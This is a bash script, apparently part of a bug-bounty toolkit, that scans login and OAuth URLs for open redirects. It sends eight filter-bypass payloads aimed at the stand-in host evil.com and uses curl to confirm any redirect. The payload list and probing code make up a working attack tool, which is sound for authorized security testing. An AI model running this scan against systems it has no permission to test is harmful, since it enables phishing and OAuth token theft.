#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  se_open_redirect.sh — Open Redirect in Auth/OAuth Flows     ║
# ║  SE-focused redirect parameter extraction + bypass testing   ║
# ╚══════════════════════════════════════════════════════════════╝
set -uo pipefail

SCRIPT_NAME="se_open_redirect.sh"
SCRIPT_DESC="Open Redirect (Auth Flow)"

script_usage() {
    echo "Usage: ${SCRIPT_NAME} [OPTIONS]"
    echo ""
    echo "  Test for open redirects in login/OAuth flows."
    echo "  Focuses on auth flow redirects (higher severity than generic)."
    echo "  Uses 8 bypass techniques per candidate."
    echo ""
    echo "Options:"
    echo "  -d, --domain DOMAIN    Target domain"
    echo "  -u, --urls FILE        File with OAuth/login URLs (from Phase 1)"
    echo "  -o, --out DIR          Output directory (default: ./out)"
    echo "  -t, --threads N        Concurrency (default: 30)"
    echo "  -h, --help             Show this help"
}

LIB_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "${LIB_DIR}/lib.sh"
parse_common_args "$@"

phase_header "4" "$SCRIPT_DESC"

if [ -z "${DOMAIN:-}" ] && [ -z "${URLS_FILE:-}" ]; then
    err "Provide --domain or --urls"
    script_usage
    exit 1
fi

# ── Input resolution ──
urls_input="${URLS_FILE:-${OUT_DIR}/oauth_urls.txt}"
findings_file="${OUT_DIR}/redirect_findings.txt"
candidates_file="${OUT_DIR}/redirect_candidates.txt"
> "$findings_file"
> "$candidates_file"

# Also check surface_urls for redirect params
for source_file in "$urls_input" "${OUT_DIR}/surface_urls.txt" "${OUT_DIR}/sensitive_urls.txt"; do
    [ ! -s "$source_file" ] && continue
    grep -iP '(redirect[_=]|url=|next=|rurl=|dest=|destination=|redir=|redirect_uri=|redirect_url=|return[_=]|return_to=|returnTo=|go=|goto=|target=|callback=|forward=|continue=|login_hint=|post_login_redirect|RelayState=)' \
        "$source_file" 2>/dev/null >> "$candidates_file" || true
done

# If no parameterized candidates, build test URLs from OAuth endpoints
if [ ! -s "$candidates_file" ] && [ -s "$urls_input" ]; then
    info "No redirect params found — building test URLs from OAuth endpoints..."
    while IFS= read -r url; do
        [ -z "$url" ] && continue
        # Append common redirect params
        for param in "redirect_uri" "redirect_url" "next" "return_to" "callback" "continue"; do
            echo "${url}?${param}=https://evil.com" >> "$candidates_file"
            echo "${url}?${param}=https://evil.com" >> "$candidates_file"
        done
    done < <(head -10 "$urls_input")
fi

if [ ! -s "$candidates_file" ]; then
    warn "No redirect candidates found — skipping"
    exit 0
fi

sort -u -o "$candidates_file" "$candidates_file"
candidate_count=$(count_lines "$candidates_file")
log "Redirect candidates: ${candidate_count}"

# ── Redirect parameter names ──
REDIRECT_PARAMS="redirect|url|next|dest|redir|return|goto|callback|forward|continue|redirect_uri|redirect_url|return_to|returnTo|RelayState|post_login_redirect"

# ── Bypass payloads ──
# Each bypass tests a different filter evasion technique
target_domain="${DOMAIN:-example.com}"
generate_payloads() {
    local base_domain="$1"
    echo "https://evil.com"                                      # Direct external
    echo "https://evil.com@${base_domain}"                       # @ trick
    echo "https://${base_domain}.evil.com"                       # Subdomain match bypass
    echo "https://evil.com/${base_domain}"                       # Path match bypass
    echo "https://evil.com%23.${base_domain}"                    # Fragment bypass
    echo "//evil.com"                                            # Protocol-relative
    echo "https://evil.com%00.${base_domain}"                    # Null byte
    echo "https://evil.com?.${base_domain}"                      # Query bypass
}

info "Testing redirect candidates with 8 bypass techniques..."
tested=0
found=0

while IFS= read -r url; do
    [ -z "$url" ] && continue
    ((tested++)) || true

    # For each redirect param in the URL, test bypass payloads
    while IFS= read -r payload; do
        # Replace existing redirect param value
        test_url=$(echo "$url" | sed -E "s/(${REDIRECT_PARAMS})=[^&]*/\1=$(echo "$payload" | sed 's|/|\\/|g')/")

        # If no param was replaced, skip
        [ "$test_url" = "$url" ] && continue

        # Follow one redirect and check Location
        response=$(curl -sk -o /dev/null -D- --connect-timeout 5 --max-time 8 "${HUNT_UA_CURL[@]}" "$test_url" 2>/dev/null || true)
        [ -z "$response" ] && continue

        # Check both Location header and final redirect_url
        location=$(echo "$response" | grep -i '^Location:' | head -1 | tr -d '\r' | awk '{print $2}')
        http_code=$(echo "$response" | head -1 | grep -oP '\d{3}' | head -1)

        if [ -n "$location" ] && echo "$location" | grep -qi "evil.com"; then
            ((found++)) || true
            # Classify: auth flow redirect = higher severity
            severity="P4"
            category="OPEN_REDIRECT"
            if echo "$url" | grep -qiP '(oauth|auth|login|sso|saml|callback)'; then
                severity="P3"
                category="AUTH_REDIRECT"
            fi
            echo "[${severity}:${category}:CONFIRMED] ${test_url} -> ${location} (HTTP ${http_code:-???})" >> "$findings_file"
            break  # One confirmed bypass per URL is enough
        fi
    done < <(generate_payloads "$target_domain")

    # Rate limit
    [ $((tested % 10)) -eq 0 ] && info "Tested ${tested}/${candidate_count} candidates (${found} found)..."
done < <(head -50 "$candidates_file")

# ── httpx-pd redirect following (if available) ──
if check_tool "httpx-pd" 2>/dev/null && [ -s "$candidates_file" ]; then
    info "Running httpx-pd redirect analysis..."
    httpx_redir="${OUT_DIR}/httpx_redirect_analysis.txt"
    head -30 "$candidates_file" | httpx-pd -silent -follow-redirects -status-code -location \
        -threads "$THREADS" "${HUNT_UA_ARGS[@]}" 2>/dev/null > "$httpx_redir" || true
    if [ -s "$httpx_redir" ]; then
        # Extract any that redirect to external domains
        grep -viP "$(echo "$target_domain" | sed 's/\./\\./g')" "$httpx_redir" | \
            grep -iP 'https?://' | while IFS= read -r line; do
            echo "[P4:OPEN_REDIRECT:HTTPX] ${line}" >> "$findings_file"
        done || true
    fi
fi

# ── Summary ──
sort -u -o "$findings_file" "$findings_file"
finding_count=$(count_lines "$findings_file")
log "Tested: ${tested} candidates"
log "Open redirect findings: ${finding_count}"
if [ "$finding_count" -gt 0 ]; then
    warn "Open redirects found:"
    cat "$findings_file"
fi
